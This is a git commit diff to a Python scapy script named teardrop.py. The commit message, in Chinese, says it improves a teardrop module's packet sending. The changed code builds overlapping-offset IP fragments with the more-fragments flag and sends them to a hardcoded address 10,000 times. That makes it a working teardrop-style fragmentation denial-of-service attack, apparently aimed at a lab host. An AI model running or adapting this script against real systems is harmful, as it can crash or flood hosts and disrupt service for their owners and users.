ffab208e8c3560d5b376483ddb606028fd863617
Kuns <2524374137@qq.com>
2022-09-26 14:43:35 +0800

    完善tear drop模块发包程序

--- venv/src/teardrop.py
+++ venv/src/teardrop.py
@@ -12,17 +12,20 @@ Desc:
 """
 
 from scapy.all import *
+import random
+import time
 
 
-def crafting_packets( flags, frag = 0, proto = 17, dst = "192.168.15.70"):
+def crafting_packets(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     network_layer = IP(
-        id = 1111,
+        id = 28752,
         flags = flags,
         frag = frag,
+        ttl = 128,
         proto = proto,
         dst = dst
     )
-    data = "111111111111111111111111"
+    data = data
     pkt = network_layer / data
     return pkt
 
@@ -32,7 +35,12 @@ def send_packers(pkt):
 
 
 if __name__ == '__main__':
-    pkt = crafting_packets(1, 0, 17)
-    send_packers(pkt)
-    pkt = crafting_packets(1, 20, 17)
-    send_packers(pkt)
+    with open("data.txt", "r") as f:
+        data = f.read()
+        # print(data)
+    for i in range(0, 10000):
+        pkt = crafting_packets(1, 0, 17, data=data)
+        send_packers(pkt)
+        pkt = crafting_packets(1, 176, 17, data=data)
+        send_packers(pkt)
+        time.sleep(0.05)
